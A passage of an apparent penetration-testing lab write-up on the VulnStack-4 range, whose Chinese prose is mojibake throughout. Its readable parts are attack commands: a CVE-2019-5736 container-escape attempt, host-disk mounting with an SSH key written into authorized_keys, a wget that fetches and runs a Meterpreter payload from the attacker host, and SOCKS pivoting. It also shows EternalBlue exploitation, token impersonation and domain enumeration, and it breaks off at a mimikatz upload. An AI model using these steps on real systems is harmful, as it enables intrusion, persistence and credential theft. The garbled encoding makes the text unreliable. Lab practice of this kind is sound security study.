src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211955352.png" alt loading="lazy"></p><p>éšåé¶æœºä¸Šæ‰§è¡Œ<code>./shell.elf</code>ï¼Œmsfå³å¯æˆåŠŸè·å¾—ä¼šè¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704212038957.png" alt loading="lazy"></p><h4 id="åˆ©ç”¨CVE-2019-5736é€ƒé€¸"><a href="#åˆ©ç”¨CVE-2019-5736é€ƒé€¸" class="headerlink" title="åˆ©ç”¨CVE-2019-5736é€ƒé€¸"></a><strong>åˆ©ç”¨CVE-2019-5736é€ƒé€¸</strong></h4><p>åœ¨Docker 18.09.2ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ä½¿ç”¨çš„runcç‰ˆæœ¬å°äº1.0-rc6ï¼Œå› æ­¤å…è®¸æ”»å‡»è€…é‡å†™å®¿ä¸»æœºä¸Šçš„runc äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚</p><p>å¹³å°æˆ–äº§å“ å—å½±å“ç‰ˆæœ¬ Docker Version &lt; 18.09.2 runC Version &lt;= 1.0-rc6</p><p>æ¶æ„å®¹å™¨éœ€æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªæ¡ä»¶ä¹‹ä¸€ï¼š</p><ul><li>ç”±ä¸€ä¸ªæ”»å‡»è€…æ§åˆ¶çš„æ¶æ„é•œåƒåˆ›å»º</li><li>æ”»å‡»è€…å…·æœ‰æŸå·²å­˜åœ¨å®¹å™¨çš„å†™æƒé™ï¼Œä¸”å¯é€šè¿‡docker execè¿›å…¥ã€‚</li></ul><p>Pocåœ°å€ï¼š<a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p><p>æ˜¯ä¸€ä¸ªgoå†™çš„è„šæœ¬ï¼Œéœ€è¦è‡ªå·±ä¸‹è½½ç¼–è¯‘</p><p>å…ˆè£…goç¯å¢ƒ</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /usr/local<span class="token function">wget</span> https://studygolang.com/dl/golang/go1.16.5.linux-amd64.tar.gz<span class="token function">tar</span> -xzf go1.16.5.linux-amd64.tar.gz<span class="token function">vim</span> /etc/profileæ·»åŠ  <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/local/go/bin<span class="token builtin class-name">source</span> /etc/profilego version</code></pre><p>å‡ºç°ç‰ˆæœ¬å·å³å®‰è£…æˆåŠŸ</p><p>ç¼–è¯‘ç”Ÿæˆpayload</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go</code></pre><p>ç”¨msfä¼šè¯å°†ç¼–è¯‘å¾—åˆ°çš„mainæ–‡ä»¶ä¸Šä¼ åˆ°dockerå®¹å™¨çš„/homeç›®å½•ä¸­ï¼Œå¹¶èµ‹æƒ</p><pre class="language-shell" data-language="shell"><code class="language-shell">upload /home/kali/CVE-2019-5736-PoC/main /home</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630153924481.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154042270.png" alt loading="lazy"></p><p>åœ¨kaliæœºä¸Šç›‘å¬</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> -lvp <span class="token number">4444</span></code></pre><p>åˆ°é¶æœºä¸Šæ‰§è¡Œ<code>./main</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154346666.png" alt loading="lazy"></p><p>æ­¤æ—¶ï¼Œåªéœ€ç­‰å¾…ç›®æ ‡æœºç®¡ç†å‘˜é‡å¯è¯¥dockerå®¹å™¨ï¼Œpayloadå°±ä¼šè§¦å‘ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬æ‰‹åŠ¨æ¨¡æ‹Ÿdockeré‡å¯ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> docker <span class="token builtin class-name">exec</span> -it 09dd4e5bfa91 /bin/bash</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154713907.png" alt loading="lazy"></p><p>æ˜¾ç¤ºpayloadæ‰§è¡ŒæˆåŠŸ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154743000.png" alt loading="lazy"></p><p>ä½†æ˜¯å¹¶æœªæ”¶åˆ°shell</p><h4 id="åˆ©ç”¨-privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸"><a href="#åˆ©ç”¨-privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸" class="headerlink" title="åˆ©ç”¨--privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸"></a><strong>åˆ©ç”¨--privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸</strong></h4><ul><li>ç‰¹æƒæ¨¡å¼äºç‰ˆæœ¬0.6æ—¶è¢«å¼•å…¥Dockerï¼Œå…è®¸å®¹å™¨å†…çš„rootæ‹¥æœ‰å¤–éƒ¨ç‰©ç†æœºrootæƒé™ï¼Œè€Œæ­¤å‰å®¹å™¨å†…rootç”¨æˆ·ä»…æ‹¥æœ‰å¤–éƒ¨ç‰©ç†æœºæ™®é€šç”¨æˆ·æƒé™ã€‚</li><li>ä½¿ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨ï¼Œå¯ä»¥è·å–å¤§é‡è®¾å¤‡æ–‡ä»¶è®¿é—®æƒé™ã€‚å› ä¸ºå½“ç®¡ç†å‘˜æ‰§è¡Œ<code>docker run â€”privileged</code>æ—¶ï¼ŒDockerå®¹å™¨å°†è¢«å…è®¸è®¿é—®ä¸»æœºä¸Šçš„æ‰€æœ‰è®¾å¤‡ï¼Œå¹¶å¯ä»¥æ‰§è¡Œmountå‘½ä»¤è¿›è¡ŒæŒ‚è½½ã€‚</li><li>å½“æ§åˆ¶ä½¿ç”¨ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„å®¹å™¨æ—¶ï¼Œdockerç®¡ç†å‘˜å¯é€šè¿‡mountå‘½ä»¤å°†å¤–éƒ¨å®¿ä¸»æœºç£ç›˜è®¾å¤‡æŒ‚è½½è¿›å®¹å™¨å†…éƒ¨ï¼Œè·å–å¯¹æ•´ä¸ªå®¿ä¸»æœºçš„æ–‡ä»¶è¯»å†™æƒé™ï¼Œæ­¤å¤–è¿˜å¯ä»¥é€šè¿‡å†™å…¥è®¡åˆ’ä»»åŠ¡ç­‰æ–¹å¼åœ¨å®¿ä¸»æœºæ‰§è¡Œå‘½ä»¤ã€‚</li></ul><p>å…·ä½“å¯å‚è€ƒï¼š<a href="https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">é…ç½®ä¸å½“å¯¼è‡´çš„å®¹å™¨é€ƒé€¸</a></p><p>å­¦ä¹ è·¯çº¿ä¸­æœ‰ä¸€ä¸ªsshå¯†é’¥åˆ©ç”¨ï¼Œæ¨æµ‹æ˜¯åˆ©ç”¨dockerçš„ç‰¹æƒæ¨¡å¼æ¥åœ¨å®¿ä¸»æœºç¡¬ç›˜ä¸­å†™å…¥sshç§é’¥ï¼Œå®ç°sshå…å¯†ç™»å½•å®¿ä¸»æœºï¼Œä»è€Œå®ç°å¯¹ç›®æ ‡å®¿ä¸»æœºçš„æ§åˆ¶</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkdir</span> /hack<span class="token function">ls</span> /dev<span class="token punctuation">..</span>.sdasda1sda2sda5<span class="token punctuation">..</span>.</code></pre><p>å°è¯•å°†<code>/dev/sda1</code>æŒ‚è½½åˆ°<code>/hack</code>ç›®å½•é‡Œ<code>mount /dev/sda1 /hack</code>ï¼Œ<code>ls /hack</code>æŸ¥çœ‹ï¼ŒæŒ‚è½½æˆåŠŸ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630155318769.png" alt loading="lazy"></p><p><strong>åœ¨dockerå®¹å™¨é‡ŒæŒ‚è½½ä¸€ä¸ªå®¿ä¸»çš„æœ¬åœ°ç›®å½•ï¼Œè¿™æ ·æŸäº›å®¹å™¨é‡Œè¾“å‡ºçš„æ–‡ä»¶ï¼Œå°±å¯ä»¥åœ¨æœ¬åœ°ç›®å½•ä¸­æ‰“å¼€è®¿é—®äº†ã€‚</strong></p><p>å°†sda1æŒ‚è½½æˆåŠŸï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¿é—®å®¹å™¨å†…éƒ¨çš„/hackè·¯å¾„æ¥è¾¾åˆ°è®¿é—®æ•´ä¸ªå®¿ä¸»æœºçš„ç›®çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬è®¿é—®<code>/hack/home</code>ç›®å½•ä¹Ÿå°±æ˜¯è®¿é—®å®¿ä¸»æœºçš„<code>/home</code>ç›®å½•</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630160348268.png" alt loading="lazy"></p><p>æœ¬åœ°ç”Ÿæˆsshç§˜é’¥</p><pre class="language-shell" data-language="shell"><code class="language-shell">ssh-keygen -f hack<span class="token function">chmod</span> <span class="token number">600</span> hack    // ä¸è¦å¿˜è®°å¯¹ç§˜é’¥æ–‡ä»¶èµ‹600æƒé™ï¼Œå¦åˆ™ä¸èƒ½æ‰§è¡Œ</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704212159965.png" alt loading="lazy"></p><p>æˆ‘ä»¬è¦å°†<code>ssh</code>ç§˜é’¥å†™å…¥åˆ°<code>.ssh</code>ç›®å½•é‡Œé¢å¹¶å°†æ–‡ä»¶å‘½åä¸º<code>authorized_keys</code>ï¼ˆç›®æ ‡æœº<code>.ssh</code>ç›®å½•æƒé™å¿…é¡»ä¸º700ï¼‰ã€‚</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">cp</span> -avx /hack/home/ubuntu/.ssh/id_rsa.pub /hack/home/ubuntu/.ssh/authorized_keys    <span class="token comment"># -avxæ˜¯å°†æƒé™ä¹Ÿä¸€èµ·å¤åˆ¶</span><span class="token builtin class-name">echo</span> <span class="token string">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCg9LpD/MuFWzIzUQB4RQCFa8Avljlla4Z0iuk3jMQVxrxcDjOhoaLmXmbS63/crPQ15s1oEzNpi2L0MtU/ZMbDFHpKVJGSwNbZeMzEnYsOMd1x4r6BojP4bN4d2okv4sYVSCgWiNUQBHWQcUcnf3rkFw309maxSIwiNNl1C6jzwCNjo3rWA9YV8869N7q/oZtPob3M5yVT77nYMOdO4mnU/A8dbr8KkmcjoVZclK1aAnu96XJywWmArtfZjF9FdlqUkB9ZhknnpxHqP1/sH5lNk/S/pOQTq94VpU4YdK4aBt5mFj16okbudhNKGOBBlNFECcQIU/11djNDYD+FqVn7H/rKuYa7LOJkNhgXv/Q7tBIuoJBrWKqFSQPxUdiTDzeuWhWVw5Kjzf3sEoTOHqO7oUD23iQHnoO1ZwxJp/CnDRSTyCcxTcUwheM+JTSEXembyDtQWPmt3g24UNish8s3INTPT2Abd1q2mspwuSKWHuZo8yIrNq5mfS8lvkhT1rc= kali@kali'</span> <span class="token operator">></span> /hack/home/ubuntu/.ssh/authorized_keys    <span class="token comment"># å°†sshç§˜é’¥å†™å…¥authorized_keysæ–‡ä»¶</span></code></pre><p>å¦‚æœä¸Šé¢echoä¸è¿›å»å¯ä»¥ç›´æ¥åœ¨msfä¸­ä¸Šä¼ </p><p>æ­¤æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨è‡ªå·±çš„ç§é’¥è¿›è¡Œå…å¯†ç™»é™†ç›®æ ‡å®¿ä¸»æœºäº†</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> -i hack ubuntu@192.168.0.105  <span class="token punctuation">(</span>å›¾åé¢åŠ çš„,IPåœ°å€å˜äº†<span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706112334391.png" alt loading="lazy"></p><h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><h4 id="å†…ç½‘æ¢æµ‹æ·»åŠ è·¯ç”±"><a href="#å†…ç½‘æ¢æµ‹æ·»åŠ è·¯ç”±" class="headerlink" title="å†…ç½‘æ¢æµ‹æ·»åŠ è·¯ç”±"></a>å†…ç½‘æ¢æµ‹æ·»åŠ è·¯ç”±</h4><p>æˆ‘ä»¬å·²ç»æ‹¿åˆ°ubuntuè¿™å°æœåŠ¡å™¨ï¼Œé‡æ–°å¼¹ä¸ªmeterpreterè¿‡æ¥</p><p>kaliæœºé‡æ–°å¼€å¯ä¸€ä¸ªWebæœåŠ¡ï¼š<code>python3 -m http.server</code></p><p>msfä¸Šç›‘å¬ç«¯å£</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">set</span> AutoRunScript migrate -f  <span class="token punctuation">(</span>è‡ªåŠ¨è¿ç§»è¿›ç¨‹,é˜²æ­¢ç”¨æˆ·åˆ é™¤æœ¨é©¬,ä¸¢å¤±ç›®æ ‡<span class="token punctuation">)</span></code></pre><p>åœ¨ubuntuä¸Šæ‰§è¡Œ</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">wget</span> http://192.168.0.106:8000/shell.elf<span class="token function">chmod</span> <span class="token number">777</span> shell.elf./shell.elf</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210702142225406.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704213704739.png" alt loading="lazy"></p><p>msfä¼ ä¸€ä¸ªewä¸Šå»<code>upload /home/kali/ew_for_linux64 /home/ubuntu</code></p><p><code>ifconfig</code>æŸ¥çœ‹Ubuntuä¸Šçš„å†…ç½‘</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704214545080.png" alt loading="lazy"></p><p>å‘ç°å­˜åœ¨ï¼ˆ192.168.183.1/24ï¼‰è¿™ä¸ªå†…ç½‘</p><p>äºæ˜¯æˆ‘ä»¬åœ¨ubuntuä¸Šå¼€å¯socks5æ­£å‘ä»£ç†</p><p>ewä¸‹é“¾æ¥ï¼š<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">chmod</span> <span class="token number">777</span> ew_for_linux64./ew_for_linux64 -s ssocksd -l <span class="token number">1080</span> </code></pre><p>æ­¤æ—¶ï¼Œkaliä¸Šçš„åº”ç”¨ç¨‹åºå°±å¯ä»¥é€šè¿‡proxychainsä»£ç†è¿›ç›®æ ‡å†…ç½‘äº†<code>vim /etc/proxychains4.conf</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704214215866.png" alt loading="lazy"></p><p>æ¢æµ‹å†…ç½‘å­˜æ´»çš„ä¸»æœºï¼Œå› ä¸ºä½¿ç”¨çš„æ˜¯socksçš„ä»£ç†ï¼Œåªèƒ½ä½¿ç”¨tcpåè®®ï¼Œæ‰€ä»¥nmapä½¿ç”¨çš„æ—¶å€™è¦ä½¿ç”¨<code>-sT</code>é€‰æ‹©ä½¿ç”¨<code>tcp</code>åè®®ï¼Œè¦ä½¿ç”¨<code>-Pn</code>ä¸ä½¿ç”¨<code>ICMP</code>çš„<code>ping</code>ç¡®è®¤ä¸»æœºå­˜æ´»</p><pre class="language-shell" data-language="shell"><code class="language-shell">proxychains4 nmap -sT -sV -Pn -n -p22,445 <span class="token number">192.168</span>.183.0/24</code></pre><p>ç»è¿‡æ‰«æå¯ä»¥å¾—çŸ¥ç›®æ ‡å†…ç½‘ä¸­è¿˜æœ‰192.168.183.129ï¼ˆWin7ï¼‰å’Œ192.168.183.130ï¼ˆDCï¼‰è¿™ä¸¤å°ä¸»æœºã€‚å¹¶ä¸”éƒ½å¼€äº†445ç«¯å£</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704222620931.png" alt loading="lazy"></p><p>åœ¨msfæ·»åŠ å†…ç½‘è·¯ç”±ï¼Œè¿™é‡Œç›´æ¥åœ¨msfä¸­<code>run autoroute</code>ä¼šæŠ¥é”™</p><p>å…·ä½“å‚è€ƒï¼š<a href="https://www.jason-w.cn/pentest/2021/02/28/242.html">https://www.jason-w.cn/pentest/2021/02/28/242.html</a></p><pre class="language-shell" data-language="shell"><code class="language-shell">backgrounduse post/multi/manage/autorouteshow options<span class="token builtin class-name">set</span> <span class="token environment constant">SESSION</span> <span class="token number">7</span><span class="token builtin class-name">set</span> SUBNET <span class="token number">192.168</span>.183.0show optionsexploitroute</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704221640149.png" alt loading="lazy"></p><p><code>exploit</code>åæŸ¥çœ‹<code>route</code>è·¯ç”±</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704221735839.png" alt loading="lazy"></p><h4 id="ms17-010åˆ©ç”¨"><a href="#ms17-010åˆ©ç”¨" class="headerlink" title="ms17_010åˆ©ç”¨"></a>ms17_010åˆ©ç”¨</h4><p>æ‰«æç›®æ ‡å†…ç½‘ä¸­å¯èƒ½å­˜åœ¨ms17_010æ°¸æ’ä¹‹è“æ¼æ´çš„ä¸»æœº</p><pre class="language-shell" data-language="shell"><code class="language-shell">use auxiliary/scanner/smb/smb_ms17_010 <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.183.128-130run</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704223127961.png" alt loading="lazy"></p><p>å…ˆæ‰“Windows7è¿™å°</p><p>æˆ‘ä»¬ä½¿ç”¨<code>chisel</code>ä»£ç†å·¥å…·æ¥è¿›è¡Œå†…ç½‘æ¸—é€è¿æ¥ï¼Œä¸‹è½½é“¾æ¥ï¼š<a href="https://github.com/jpillora/chiselï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥çœ‹ï¼šhttps://www.anquanke.com/post/id/234771ï¼Œä¸ºä»€ä¹ˆä¸ç”¨åŸæ¥çš„ewï¼Œå› ä¸ºç”¨ewä¸ç¨³å®šï¼Œ`ms17_011`æ‰“ä¸é€šï¼ˆæœ¬äººäº²æµ‹æ‰“ä¸é€šï¼‰">https://github.com/jpillora/chiselï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥çœ‹ï¼šhttps://www.anquanke.com/post/id/234771ï¼Œä¸ºä»€ä¹ˆä¸ç”¨åŸæ¥çš„ewï¼Œå› ä¸ºç”¨ewä¸ç¨³å®šï¼Œ`ms17_011`æ‰“ä¸é€šï¼ˆæœ¬äººäº²æµ‹æ‰“ä¸é€šï¼‰</a></p><p>Ubuntuä¸Šæ‰§è¡Œ<code>./chisel server -p 2333 --socks5</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103219718.png" alt loading="lazy"></p><p>Kaliæœºä¸Šè¿›è¡Œè¿æ¥<code>./chisel client 192.168.0.107:2333 1080:socks</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103303270.png" alt loading="lazy"></p><p>åå‘ä»£ç†ï¼Œè¿™æ ·æˆ‘ä»¬kaliæœºä¸Šçš„1080ç«¯å£å°±å¯ä»¥è®¿é—®å†…ç½‘é‡Œçš„ä¸»æœºäº†</p><p>ç„¶åç”¨msfæ‰“</p><pre class="language-shell" data-language="shell"><code class="language-shell">setg Proxies socks5:127.0.0.1:1080       // è®¾ç½®ä»£ç†ï¼Œä¸è®¾ç½®ä»£ç†ms17_010å¾ˆéš¾æ‰“é€šuse exploit/windows/smb/ms17_010_eternalblue<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp<span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.183.129<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.0.106<span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span><span class="token builtin class-name">set</span> AutoRunScript post/windows/manage/migrate             // è‡ªåŠ¨è¿ç§»è¿›ç¨‹run</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103725565.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103739255.png" alt loading="lazy"></p><p>ä¸€æ¬¡æ‰“é€š</p><h4 id="å†…ç½‘ä¿¡æ¯æœé›†"><a href="#å†…ç½‘ä¿¡æ¯æœé›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æœé›†"></a>å†…ç½‘ä¿¡æ¯æœé›†</h4><pre class="language-shell" data-language="shell"><code class="language-shell">sysinfo                <span class="token comment">#æŸ¥çœ‹ä¸»æœºä¿¡æ¯</span>getuid                 <span class="token comment">#æŸ¥çœ‹å½“å‰token</span>use incognito          <span class="token comment">#åŠ è½½incognitoï¼Œï¼ˆç”¨æ¥ç›—çªƒç›®æ ‡ä¸»æœºçš„ä»¤ç‰Œæˆ–æ˜¯å‡å†’ç”¨æˆ·)</span>list_tokens -u         <span class="token comment">#åˆ—å‡ºç›®æ ‡ä¸»æœºç”¨æˆ·çš„å¯ç”¨ä»¤ç‰Œ</span>impersonate_token <span class="token string">"DEMO\douser"</span> <span class="token comment">#æ¨¡æ‹ŸDEMO\douserç”¨æˆ·</span>rev2self               <span class="token comment">#è¿”å›åˆ°ä¹‹å‰çš„AccessTokenæƒé™</span></code></pre><pre class="language-shell" data-language="shell"><code class="language-shell">execute -f cmd.exe -i       <span class="token comment"># äº¤äº’å¼è¿è¡Œcmd</span>execute -f cmd.exe -i -t    <span class="token comment"># ä½¿ç”¨å¯ç”¨token è¿è¡Œ</span>execute -f cmd.exe -i -H -t <span class="token comment"># åŒä¸Šï¼ŒåŒæ—¶éšè—è¿›ç¨‹</span><span class="token comment"># å¯ä»¥ç›´æ¥shell</span>chcp <span class="token number">65001</span>      <span class="token comment"># ç®€å•è§£å†³ä¸€ä¸‹ä¹±ç </span>ipconfig /all   <span class="token comment"># æŸ¥çœ‹æœ¬æœºipï¼Œæ‰€åœ¨åŸŸ</span>route print     <span class="token comment"># æ‰“å°è·¯ç”±ä¿¡æ¯</span>net view        <span class="token comment"># æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºå</span>arp -a          <span class="token comment"># æŸ¥çœ‹arpç¼“å­˜</span><span class="token function">whoami</span>net start       <span class="token comment"># æŸ¥çœ‹å¼€å¯äº†å“ªäº›æœåŠ¡</span>net share       <span class="token comment"># æŸ¥çœ‹å¼€å¯äº†å“ªäº›å…±äº«</span>net share ipc$  <span class="token comment"># å¼€å¯ipcå…±äº«</span>net share c$    <span class="token comment"># å¼€å¯cç›˜å…±äº«</span>net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>ipc$ <span class="token string">""</span> /user:<span class="token string">""</span>   <span class="token comment"># ä¸192.168.xx.xxå»ºç«‹ç©ºè¿æ¥</span>net use <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>c$ <span class="token string">"å¯†ç "</span> /user:<span class="token string">"ç”¨æˆ·å"</span>  <span class="token comment"># å»ºç«‹cç›˜å…±äº«</span><span class="token function">dir</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.xx.xx<span class="token punctuation">\</span>c$<span class="token punctuation">\</span>user    <span class="token comment"># æŸ¥çœ‹192.168.xx.xx cç›˜userç›®å½•ä¸‹çš„æ–‡ä»¶</span><span class="token comment"># ä»¥ä¸‹å‘½ä»¤éœ€è¦åˆ‡æ¢åˆ°åŸŸç”¨æˆ·douseræ‰§è¡Œ</span>net config Workstation   <span class="token comment"># æŸ¥çœ‹è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸ</span>net user                 <span class="token comment"># æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨</span>net user /domain         <span class="token comment"># æŸ¥çœ‹åŸŸç”¨æˆ·</span>net localgroup administrators   <span class="token comment"># æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼ˆé€šå¸¸ä¼šæœ‰åŸŸç”¨æˆ·ï¼‰</span>net view /domain         <span class="token comment"># æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ</span>net user ç”¨æˆ·å /domain   <span class="token comment"># è·å–æŒ‡å®šåŸŸç”¨æˆ·çš„ä¿¡æ¯</span>net group /domain        <span class="token comment"># æŸ¥çœ‹åŸŸé‡Œé¢çš„å·¥ä½œç»„ï¼ŒæŸ¥çœ‹æŠŠç”¨æˆ·åˆ†äº†å¤šå°‘ç»„ï¼ˆåªèƒ½åœ¨åŸŸæ§ä¸Šæ“ä½œï¼‰</span>net group ç»„å /domain    <span class="token comment"># æŸ¥çœ‹åŸŸä¸­æŸå·¥ä½œç»„</span>net group <span class="token string">"domain admins"</span> /domain  <span class="token comment"># æŸ¥çœ‹åŸŸç®¡ç†å‘˜çš„åå­—</span>net group <span class="token string">"domain computers"</span> /domain  <span class="token comment"># æŸ¥çœ‹åŸŸä¸­çš„å…¶ä»–ä¸»æœºå</span>net group <span class="token string">"doamin controllers"</span> /domain  <span class="token comment"># æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ï¼ˆå¯èƒ½æœ‰å¤šå°ï¼‰</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705110427222.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112759516.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112650145.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705112722114.png" alt loading="lazy"></p><p>ç”±æœé›†åˆ°çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬çŸ¥é“ç›®æ ‡win7åœ¨demo.comåŸŸä¸­ï¼ŒåŸŸæ§ä¸º<code>WIN-ENS2VR5TR3N</code>ï¼ŒåŸŸç®¡ç†å‘˜ä¸º<code>Administrator</code>ï¼Œ<code>ping</code>æŸ¥çœ‹åŸŸæ§<code>ip</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705113022472.png" alt loading="lazy"></p><p>åœ¨ç›®æ ‡æœºä¸Šä¼ mimikatzï¼ŒæŠ“ä¸€ä¸‹Windows 7çš„å¯†ç 